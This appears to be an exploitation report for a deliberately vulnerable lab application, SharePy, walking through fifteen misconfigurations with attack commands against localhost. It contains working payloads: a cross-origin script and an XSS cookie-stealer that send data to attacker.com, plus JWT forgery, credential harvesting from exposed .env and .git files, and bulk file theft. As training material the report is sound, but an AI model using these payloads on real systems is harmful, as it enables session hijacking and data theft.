# SharePy Exploitation Report

This document provides detailed exploitation methods for all 15 security misconfigurations in the vulnerable SharePy application.

## Table of Contents
1. [M1: Admin Password in Clear Text](#m1-admin-password-in-clear-text)
2. [M2: Debug Mode Enabled](#m2-debug-mode-enabled)
3. [M3: Directory Listing Enabled](#m3-directory-listing-enabled)
4. [M4: Sensitive Files Accessible](#m4-sensitive-files-accessible)
5. [M5: pgAdmin/Adminer Publicly Accessible](#m5-pgadminadminer-publicly-accessible)
6. [M6: MinIO Public Bucket + Keys in Code](#m6-minio-public-bucket--keys-in-code)
7. [M7: CORS Wildcard](#m7-cors-wildcard)
8. [M8: No Security Headers](#m8-no-security-headers)
9. [M9: Insecure Cookies](#m9-insecure-cookies)
10. [M10: Default FastAPI/Uvicorn Banner](#m10-default-fastapiuvicorn-banner)
11. [M11: Verbose Nginx Errors](#m11-verbose-nginx-errors)
12. [M12: Internal Ports Exposed](#m12-internal-ports-exposed)
13. [M13: chmod 777 on Uploads](#m13-chmod-777-on-uploads)
14. [M14: /debug/info Endpoint](#m14-debuginfo-endpoint)
15. [M15: Weak JWT Secret](#m15-weak-jwt-secret)

---

## M1: Admin Password in Clear Text

### Description
Hardcoded administrative credentials in source code and configuration files.

### Exploitation Steps
1. Access the exposed `.env` file:
   ```bash
   curl http://localhost/.env
   ```
   
2. Extract the database credentials:
   ```
   DATABASE_URL=postgresql://admin:admin123@postgres:5432/sharepy
   ```

3. Access the source code to find additional hardcoded credentials:
   ```bash
   curl http://localhost/__pycache__/main.cpython-311.pyc
   # Or examine the main.py file directly if accessible
   ```

4. Find the admin password in the source code:
   ```python
   ADMIN_PASSWORD = "admin123"
   ADMIN_EMAIL = "admin@sharepy.local"
   ```

### Impact
Full administrative access to the application and database, leading to complete system compromise.

---

## M2: Debug Mode Enabled

### Description
FastAPI running in debug mode exposes detailed error messages and stack traces.

### Exploitation Steps
1. Trigger an error by accessing a non-existent endpoint:
   ```bash
   curl http://localhost:8000/nonexistent
   ```

2. Observe the detailed stack trace that reveals:
   - File paths on the server
   - Source code snippets
   - Internal application structure
   - Framework version information

### Impact
Information disclosure that aids attackers in understanding the application architecture and identifying further vulnerabilities.

---

## M3: Directory Listing Enabled

### Description
Nginx configuration allows browsing of the uploads directory.

### Exploitation Steps
1. Access the uploads directory:
   ```bash
   curl http://localhost/uploads/
   ```

2. View all uploaded files without authentication:
   ```bash
   curl http://localhost/uploads/sensitive_document.pdf
   ```

### Impact
Unauthorized access to all uploaded files, violating user privacy and potentially exposing sensitive data.

---

## M4: Sensitive Files Accessible

### Description
Configuration files and version control history are publicly accessible.

### Exploitation Steps
1. Access the .env file:
   ```bash
   curl http://localhost/.env
   ```

2. Access the .git directory:
   ```bash
   curl http://localhost/.git/config
   curl http://localhost/.git/HEAD
   ```

3. Download the entire git repository:
   ```bash
   wget -r http://localhost/.git/
   ```

4. Access Python bytecode:
   ```bash
   curl http://localhost/__pycache__/main.cpython-311.pyc
   ```

5. Look for backup files:
   ```bash
   curl http://localhost/backup.db
   curl http://localhost/config.py.bak
   ```

### Impact
Source code disclosure, credential theft, and exposure of development history.

---

## M5: pgAdmin/Adminer Publicly Accessible

### Description
Database administration tool exposed without authentication.

### Exploitation Steps
1. Access Adminer:
   ```bash
   open http://localhost:8080
   ```

2. Connect to PostgreSQL directly using credentials found in .env:
   - Server: postgres
   - Username: admin
   - Password: admin123
   - Database: sharepy

3. Perform database operations:
   - View all users and their data
   - Modify or delete records
   - Extract sensitive information
   - Drop tables

### Impact
Full database compromise and unauthorized data manipulation.

---

## M6: MinIO Public Bucket + Keys in Code

### Description
Object storage credentials hardcoded and service exposed publicly.

### Exploitation Steps
1. Install MinIO client:
   ```bash
   wget https://dl.min.io/client/mc/release/linux-amd64/mc
   chmod +x mc
   ```

2. Configure with leaked credentials:
   ```bash
   ./mc alias set myminio http://localhost:9000 minioadmin minioadmin
   ```

3. List all buckets:
   ```bash
   ./mc ls myminio
   ```

4. Download all files:
   ```bash
   ./mc mirror myminio/sharepy ./stolen_files/
   ```

### Impact
Complete theft of all uploaded files from the application.

---

## M7: CORS Wildcard

### Description
Cross-Origin Resource Sharing configured to allow all origins.

### Exploitation Steps
1. Create a malicious webpage:
   ```html
   <!-- evil.html -->
   <script>
   fetch('http://localhost:8000/api/admin/users', {
       credentials: 'include'
   })
   .then(r => r.json())
   .then(data => {
       // Exfiltrate to attacker server
       fetch('https://attacker.com/collect', {
           method: 'POST',
           body: JSON.stringify(data)
       });
   });
   </script>
   ```

2. Trick a victim into visiting the malicious page while logged into SharePy.

3. The victim's browser will automatically send the request with credentials due to CORS misconfiguration.

### Impact
Cross-site request forgery (CSRF) and data exfiltration attacks.

---

## M8: No Security Headers

### Description
Missing essential HTTP security headers.

### Exploitation Steps
1. Check missing headers:
   ```bash
   curl -I http://localhost
   ```

2. Observe missing security headers:
   - Strict-Transport-Security (HSTS)
   - Content-Security-Policy (CSP)
   - X-Content-Type-Options
   - X-Frame-Options
   - X-XSS-Protection

3. Exploit the missing protections:
   - Perform clickjacking attacks
   - Execute XSS payloads more easily
   - Conduct man-in-the-middle attacks
   - Launch content sniffing attacks

### Impact
Enables multiple attack vectors that would otherwise be mitigated by proper security headers.

---

## M9: Insecure Cookies

### Description
Session cookies missing security attributes.

### Exploitation Steps
1. Inspect cookies in browser DevTools
2. Observe missing cookie attributes:
   - Secure flag (can be stolen over HTTP)
   - HttpOnly flag (accessible via JavaScript)
   - SameSite flag (CSRF possible)

3. Steal cookie via XSS:
   ```html
   <script>
   fetch('https://attacker.com/?cookie=' + document.cookie);
   </script>
   ```

### Impact
Session hijacking and XSS-based credential theft.

---

## M10: Default FastAPI/Uvicorn Banner

### Description
Server headers reveal technology stack versions.

### Exploitation Steps
1. Check server header:
   ```bash
   curl -I http://localhost:8000
   ```

2. Response shows:
   ```
   Server: uvicorn/0.24.0
   Powered by FastAPI
   ```

3. Search for known vulnerabilities:
   ```bash
   searchsploit uvicorn 0.24
   ```

### Impact
Version disclosure enables targeted exploits against known vulnerabilities.

---

## M11: Verbose Nginx Errors

### Description
Nginx configured with debug-level error logging.

### Exploitation Steps
1. Trigger a 404 error:
   ```bash
   curl http://localhost/nonexistent/path/to/file
   ```

2. Error message reveals:
   - Full filesystem path: `/usr/share/nginx/html/nonexistent/path/to/file`
   - Nginx version
   - Internal directory structure

### Impact
Information disclosure that aids in path traversal and other attacks.

---

## M12: Internal Ports Exposed

### Description
Internal services exposed on public ports.

### Exploitation Steps
1. Scan exposed ports:
   ```bash
   nmap -p- localhost
   ```

2. Found services:
   - 5432/tcp (PostgreSQL)
   - 9000/tcp (MinIO)
   - 8080/tcp (Adminer)

3. Direct PostgreSQL access:
   ```bash
   psql -h localhost -p 5432 -U admin -d sharepy
   # Password: admin123
   ```

4. Direct MinIO access:
   ```bash
   curl http://localhost:9000
   ```

### Impact
Direct access to internal services, bypassing application-layer security controls.

---

## M13: chmod 777 on Uploads

### Description
World-writable permissions on the uploads directory.

### Exploitation Steps
1. Check permissions:
   ```bash
   docker exec -it <backend-container> ls -la /app/uploads
   ```

2. Observe permissions:
   ```
   drwxrwxrwx ... uploads/
   ```

3. Upload malicious script:
   ```bash
   curl -F "file=@malicious.sh" http://localhost:8000/upload
   ```

4. Execute it (if web server runs it):
   ```bash
   curl http://localhost/uploads/malicious.sh
   ```

5. Or modify existing files:
   ```bash
   docker exec -it <backend-container> bash
   echo "malicious code" > /app/uploads/legitimate_file.py
   ```

### Impact
Arbitrary file write/execute capabilities and potential privilege escalation.

---

## M14: /debug/info Endpoint

### Description
Debug endpoint that leaks environment information.

### Exploitation Steps
1. Access debug endpoint:
   ```bash
   curl http://localhost:8000/debug/info
   ```

2. Receive complete environment information:
   ```json
   {
     "env": {
       "DATABASE_URL": "postgresql://admin:admin123@postgres:5432/sharepy",
       "JWT_SECRET": "secret123",
       "MINIO_ACCESS_KEY": "minioadmin",
       "MINIO_SECRET_KEY": "minioadmin",
       "...": "..."
     },
     "cwd": "/app",
     "files": ["main.py", ".env", "uploads", "..."]
   }
   ```

### Impact
Complete environment disclosure including all secrets and credentials.

---

## M15: Weak JWT Secret

### Description
Weak secret used for JWT token signing.

### Exploitation Steps
1. Capture a JWT token from a legitimate user session.

2. Brute force the weak secret:
   ```bash
   python3 jwt_tool.py $TOKEN -d /usr/share/wordlists/rockyou.txt
   ```

3. Or use the known weak secret to forge tokens:
   ```python
   import jwt
   forged_token = jwt.encode({'email': 'admin@sharepy.local', 'role': 'admin'}, 'secret123', algorithm='HS256')
   print(forged_token)
   ```

4. Use forged token to access admin endpoints:
   ```bash
   curl -H "Authorization: Bearer $FORGED_TOKEN" http://localhost:8000/admin/users
   ```

### Impact
Authentication bypass and privilege escalation to administrative access.